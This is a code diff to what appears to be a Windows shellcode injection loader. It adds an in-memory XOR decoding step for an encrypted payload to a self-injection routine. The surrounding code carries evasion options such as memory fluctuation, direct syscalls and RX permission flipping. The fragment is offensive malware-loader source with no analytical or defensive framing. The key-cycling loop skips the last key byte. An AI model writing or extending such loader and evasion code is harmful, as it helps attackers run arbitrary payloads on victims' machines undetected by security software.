@@ -72,7 +72,11 @@ void executor(void (*shellcode)(void)) {
     (*shellcode)();
 }
 
+#if CUSTOMENC
+LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, unsigned char key[], SIZE_T key_size, PHANDLE phThread, BOOL wait, unsigned int sleep_time) {
+#else
 LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThread, BOOL wait, unsigned int sleep_time) {
+#endif
     #ifdef _DEBUG_
         if (sleep_time > 0)
             wprintf(L"sleeping for %d seconds!\n", sleep_time);
@@ -95,7 +99,8 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
     #ifdef FLUCTUATE
         fluctuate();
     #endif
-
+	
+	
     #if defined(SELFINJECT) && defined(RX) && defined(_TEXT_)
         typedef void* (*funcPtr)();
         funcPtr func = (funcPtr)shellcode;
@@ -185,7 +190,38 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
         #ifdef _DEBUG_
             wprintf(L"Written %d bytes of data @ 0x%x\n", bytesWritten, allocation);
         #endif
-
+		
+		#ifdef CUSTOMENC
+		#ifdef _DEBUG_		
+			wprintf(L"sizeof key %d\n", key_size);
+		#endif
+		#ifdef _DEBUG_		
+			wprintf(L"sizeof shellcode %d\n", size);
+		#endif
+		int k = 0;
+		unsigned char *ptr = (unsigned char *)allocation;
+		for(int i=0;i < size; i++){
+			if(k == key_size-1){
+				k = 0;
+			}
+			#ifdef _DEBUG_		
+			wprintf(L"before %d\n", ptr[i]);
+			#endif
+			ptr[i] = ptr[i] ^ key[k];
+			#ifdef _DEBUG_		
+			wprintf(L"after %d\n", ptr[i]);
+			#endif
+			#ifdef _DEBUG_
+			//wprintf(L"DECODED: ptr[%d] = %d\n", i, ptr[i]);
+			#endif
+			k++;
+		}
+		#ifdef _DEBUG_
+		for(int i=0;i < size-1; i++){
+			wprintf(L"%d\n", *((unsigned char *)(allocation)+i));
+		}
+		#endif
+		#endif
         #ifdef RX
             DWORD old = 0;
             #ifdef SYSCALLS
